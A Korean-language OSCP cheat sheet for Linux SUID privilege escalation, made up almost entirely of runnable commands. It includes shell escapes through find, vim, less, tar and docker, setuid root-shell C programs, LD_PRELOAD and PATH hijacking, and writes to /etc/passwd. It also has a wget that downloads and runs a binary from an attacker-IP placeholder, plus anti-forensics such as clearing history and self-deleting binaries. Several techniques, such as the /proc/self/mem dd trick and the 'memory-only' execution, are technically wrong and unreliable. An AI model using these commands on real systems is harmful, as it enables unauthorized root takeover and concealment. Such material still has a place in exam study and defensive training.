# OSCP 침투 테스트 - SUID 권한 상승 치트시트

## 1. 초기 정찰 및 SUID 파일 탐색

### 시스템 전체에서 SUID 파일 검색

```bash
# 기본 검색 - 모든 SUID 파일 찾기
find / -perm -4000 -type f 2>/dev/null

# 상세 정보와 함께 표시
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 특정 위치에서만 검색
find /usr/bin -perm -4000 -type f 2>/dev/null
find /bin -perm -4000 -type f 2>/dev/null
find /usr/sbin -perm -4000 -type f 2>/dev/null
find /usr/local/bin -perm -4000 -type f 2>/dev/null
find /usr/local/sbin -perm -4000 -type f 2>/dev/null

# root 소유자 SUID 파일만 필터링 (효율적)
find / -perm -4000 -user root -type f 2>/dev/null

# SGID 파일 검색 (그룹 권한으로 실행)
find / -perm -2000 -type f 2>/dev/null

# SUID와 SGID 모두 검색
find / -perm -6000 -type f 2>/dev/null
```

### 결과 분석 및 후보 추려내기

```bash
# 결과를 파일로 저장
find / -perm -4000 -type f 2>/dev/null | tee suid_files.txt

# 알려진 취약 바이너리 필터링
cat suid_files.txt | grep -E 'bash|find|nmap|vim|less|python|perl|ruby|awk|cp|tar|docker|screen|env|man|more'

# root 소유 파일만 필터링해서 추출
cat suid_files.txt | xargs -I{} ls -l {} 2>/dev/null | grep '^-rws.* root'
```

## 2. SUID 파일 분석 방법

### 각 파일별 분석 기법

```bash
# 소유자 및 권한 확인
ls -l /경로/대상파일

# 파일 유형 분석
file /경로/대상파일

# 문자열 분석 - 쉘 명령어 검색
strings /경로/대상파일 | grep -i "sh\|bash\|system\|exec\|popen"

# 라이브러리 의존성 확인
ldd /경로/대상파일

# strace로 시스템 호출 분석
strace -f /경로/대상파일 2>&1 | grep -i "exec\|system"
```

### 판단 시 확인할 핵심 요소

- 소유자가 root이며 s 비트가 설정되어 있는가? (-rwsr-xr-x)
- 실행 가능한 바이너리인가?
- 시스템 명령어 실행 (system, exec, popen) 함수를 포함하는가?
- 상대 경로로 라이브러리나 파일을 로드하는가? (경로 조작 가능성)
- 사용자 입력을 처리하는 방식이 안전한가? (명령어 삽입 가능성)

## 3. 바이너리 별 권한 상승 기법

### 쉘 직접 획득 기법

```bash
# bash SUID 설정된 경우
/bin/bash -p    # -p 옵션: 권한 보존 모드로 실행

# dash/sh SUID 설정된 경우
/bin/dash -p
/bin/sh -p

# find 명령어
find . -exec /bin/sh -p \; -quit

# env 명령어
env /bin/sh -p

# awk 활용
awk 'BEGIN {system("/bin/sh -p")}'

# 쉘 스크립트 실행기
/path/to/suid_script.sh    # 직접 실행
```

### 인터프리터 활용 기법

```bash
# Python 활용
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/sh")'

# Perl 활용
perl -e 'use POSIX; setuid(0); exec "/bin/sh";'

# Ruby 활용
ruby -e 'require "fileutils"; FileUtils.chmod(0700, "/etc/shadow")'
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'

# Node.js 활용
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### 인터랙티브 도구 이용 기법

```bash
# vim/vi 에디터 활용
vim -c ':!sh'
vim
# vim 내에서:
:set shell=/bin/sh
:shell

# less 페이저 활용
less /etc/passwd
# less 내에서:
!sh

# more 페이저 활용
more /etc/passwd
# more 내에서 (화면이 채워진 상태):
!sh

# man 페이저 활용
man man
# man 내에서:
!sh

# 구버전 nmap 활용 (3.x 이하)
nmap --interactive
# nmap 내에서:
!sh
```

### 복사 기법

```bash
# cp를 이용한 쉘 복사
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p

# 쓰기 가능한 폴더에 쉘 복사
cp /bin/sh /dev/shm/rootshell
chmod +s /dev/shm/rootshell
/dev/shm/rootshell -p
```

### 컴파일 기법

```bash
# gcc를 이용한 루트 쉘 컴파일
cat > rootshell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc rootshell.c -o rootshell
chmod +s rootshell
./rootshell

# 간단한 버전
echo 'int main(){setuid(0);system("/bin/sh -p");}' > r.c && gcc r.c -o r && ./r

# 바이너리 복사 없이 메모리에서 직접 실행
gcc -xc - -o /dev/shm/rootshell << EOF
#include <unistd.h>
int main() {
    setuid(0);
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
EOF
chmod +x /dev/shm/rootshell
/dev/shm/rootshell
```

## 4. 고급 권한 상승 기법

### 특수 명령어 활용

```bash
# tar 명령어 체크포인트 기능 활용
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# zip 명령어를 이용한 명령 실행
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF

# docker 그룹 권한 이용 (docker 그룹 포함 시)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# screen 취약점 활용 (4.5.0 이하)
screen -D -m -L bash -c 'exec bash -i'

# wget을 이용한 파일 다운로드 및 실행
cd /tmp
wget http://공격자IP/rootshell -O rootshell
chmod +x rootshell
./rootshell
```

### 환경변수 조작 기법

```bash
# 환경변수 PATH 조작
cd /tmp
echo '#!/bin/sh' > ls
echo '/bin/sh' >> ls
chmod +x ls
export PATH=/tmp:$PATH
/경로/취약한_SUID_바이너리  # 내부적으로 ls 실행 시 /tmp/ls가 먼저 실행됨

# LD_PRELOAD 활용 (SUID 바이너리가 이 변수를 무시하지 않는 경우)
cat > /tmp/rootshell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    exit(0);
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/rootshell.so /tmp/rootshell.c
export LD_PRELOAD=/tmp/rootshell.so
/경로/취약한_SUID_바이너리
```

### 심볼릭 링크 기법

```bash
# 심볼릭 링크를 이용한 파일 액세스
ln -sf /etc/shadow /tmp/test
cat /tmp/test  # shadow 파일 내용 읽기

# 심볼릭 링크로 중요 파일 수정
ln -sf /etc/passwd /tmp/passwd
echo 'root2:x:0:0::/root:/bin/bash' >> /tmp/passwd
```

## 5. OSCP 시험에 유용한 자동 스크립트

```bash
#!/bin/bash
# SUID 권한 상승 자동화 스크립트 (OSCP 시험용)
echo "[*] SUID 파일 자동 탐색 시작"
find / -perm -4000 -type f 2>/dev/null | tee suid_list.txt

echo -e "\n[*] root 소유 SUID 파일 필터링"
cat suid_list.txt | xargs -I{} ls -l {} 2>/dev/null | grep '^-rws.* root' | tee root_suid.txt

echo -e "\n[*] 알려진 취약 바이너리 탐색"
cat suid_list.txt | grep -E 'bash|find|nmap|vim|less|more|man|python|perl|ruby|awk|env|cp|tar|docker|screen' | tee vuln_suid.txt

echo -e "\n[*] 발견된 SUID 파일 분석 결과"
for binary in $(cat vuln_suid.txt); do
    echo -e "\n[+] 분석 중: $binary"
    file $binary
    strings $binary | grep -i "system\|exec\|popen\|sh\|bash" | head -5
done

echo -e "\n[*] 권한 상승 시도 가능한 파일 목록"
cat vuln_suid.txt
```

## 6. 일반적인 권한 상승 과정

### 1. SUID 파일 검색

```bash
find / -perm -4000 -type f 2>/dev/null
```

### 2. 주목할만한 바이너리 확인

```bash
ls -la /path/to/suspicious_binary
file /path/to/suspicious_binary
```

### 3. 취약점 분석

```bash
strings /path/to/suspicious_binary | grep -i "system\|exec\|sh"
strace -f /path/to/suspicious_binary 2>&1 | grep -i "exec"
```

### 4. 권한 상승 시도

위에서 파악된 방법에 따라 해당 바이너리에 적합한 기법 선택하여 시도

### 5. 권한 검증

```bash
id       # 현재 사용자 ID 확인
whoami   # 현재 사용자 확인
```

### 6. 흔적 제거

```bash
export HISTSIZE=0
history -c
rm -f /tmp/rootshell* 2>/dev/null
```

## 7. 놓치기 쉬운 SUID 기법

### /proc 파일시스템 활용

```bash
# /proc/자가메모리맵 이용해 바이너리 수정
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
dd if=/proc/self/mem of=/tmp/bash bs=1 seek=$(grep -a -b -o /bin/sh /proc/self/mem | head -n 1 | cut -d: -f1) count=7 conv=notrunc
/tmp/bash -p
```

### 커스텀 라이브러리 인젝션

```bash
# 특정 함수를 후킹하는 라이브러리 생성
cat > hook.c << EOF
int geteuid() { return 0; }
EOF
gcc -fPIC -shared hook.c -o hook.so -nostartfiles
LD_PRELOAD=./hook.so /path/to/vulnerable_binary
```

### 타이머 레이스 컨디션 공격

```bash
# 파일 접근 레이스 컨디션
while true; do
    ln -sf /etc/passwd /tmp/file
    ln -sf /root/.ssh/id_rsa /tmp/file
done
```

## 8. 탐지 우회 및 안티 포렌식 기법

### 메모리 전용 실행

```bash
# 디스크에 파일 쓰지 않고 메모리에서 실행
cat > /dev/shm/rootshell.c << EOF
#include <unistd.h>
int main() {
    setuid(0);
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
EOF
gcc /dev/shm/rootshell.c -o /dev/shm/rootshell
chmod +x /dev/shm/rootshell
/dev/shm/rootshell

# 실행 후 흔적 제거
rm -f /dev/shm/rootshell*
```

### 단기 실행 후 삭제

```bash
# 자기 삭제 코드
cat > /tmp/rootshell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char cmd[100];
    setuid(0);
    setgid(0);
    system("/bin/sh -p");
    sprintf(cmd, "rm -f %s", argv[0]);
    system(cmd);
    return 0;
}
EOF
gcc /tmp/rootshell.c -o /tmp/rootshell
chmod +x /tmp/rootshell
/tmp/rootshell
```
